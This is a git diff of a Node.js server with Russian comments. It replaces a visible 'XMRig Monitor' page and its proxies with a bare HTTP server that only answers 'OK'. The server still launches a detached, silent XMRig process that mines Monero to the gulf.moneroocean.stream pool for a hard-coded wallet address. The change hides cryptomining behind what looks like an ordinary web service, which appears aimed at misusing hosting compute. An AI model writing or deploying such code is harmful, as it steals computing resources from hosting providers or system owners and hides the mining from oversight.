@@ -1,50 +1,19 @@
-const express = require('express');
-const { createProxyMiddleware } = require('http-proxy-middleware');
+const http = require('http');
 const { spawn } = require('child_process');
 
-const app = express();
 const port = process.env.PORT || 3000;
 
-// Логгер запросов
-app.use((req, res, next) => {
-  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
-  next();
+// Создаём сервер, который сразу отвечает "OK"
+const server = http.createServer((req, res) => {
+  res.writeHead(200, { 'Content-Type': 'text/plain' });
+  res.end('OK');
 });
-
-// Главная страница — отвечаем мгновенно
-app.get('/', (req, res) => {
-  res.send(`
-    <html>
-      <head><title>XMRig Monitor</title></head>
-      <body style="font-family: sans-serif; text-align: center; padding: 40px;">
-        <h1>⛏️ XMRig Monitor</h1>
-        <p>Майнер запущен и работает.</p>
-        <p><a href="/workers" target="_blank">📊 Открыть xmrig-workers</a></p>
-        <p><a href="/api" target="_blank">📡 Открыть API майнера</a></p>
-      </body>
-    </html>
-  `);
-});
-
-// Прокси для xmrig-workers
-app.use('/workers', createProxyMiddleware({
-  target: 'http://localhost:3001',
-  changeOrigin: true,
-  pathRewrite: { '^/workers': '' },
-}));
-
-// Прокси для API XMRig
-app.use('/api', createProxyMiddleware({
-  target: 'http://localhost:3000',
-  changeOrigin: true,
-  pathRewrite: { '^/api': '' },
-}));
 
 // Запускаем сервер
-const server = app.listen(port, '0.0.0.0', () => {
-  console.log(`✅ HTTP server is ready on port ${port}`);
+server.listen(port, '0.0.0.0', () => {
+  console.log(`✅ HTTP server ready on port ${port}`);
   
-  // Запускаем майнер в фоне, без блокировки
+  // Запускаем майнер в фоне
   const miner = spawn('/entrypoint.sh', [
     '-o', 'gulf.moneroocean.stream:10004',
     '-u', '48oFiSuK4K4WBpQ29kx73CBRtSpm132W2hoXr9RyfUbUCrbvgqLV9PBH1aqyckZemdabBjrwM2D3YieJQD6CKiGZVgkxU36',
@@ -52,17 +21,16 @@ const server = app.listen(port, '0.0.0.0', () => {
     '-k',
     '-t', '2'
   ], {
-    detached: true,          // отдельный процесс
-    stdio: 'ignore',         // не ждём вывода
+    detached: true,
+    stdio: 'ignore'
   });
   
-  miner.unref();  // позволяем процессу не блокировать завершение сервера
-  
-  console.log('🚀 Miner started in background (PID: ' + miner.pid + ')');
+  miner.unref();
+  console.log(`🚀 Miner started (PID: ${miner.pid})`);
 });
 
 // Корректное завершение
 process.on('SIGTERM', () => {
-  console.log('Received SIGTERM, shutting down...');
+  console.log('Shutting down...');
   server.close(() => process.exit(0));
 });
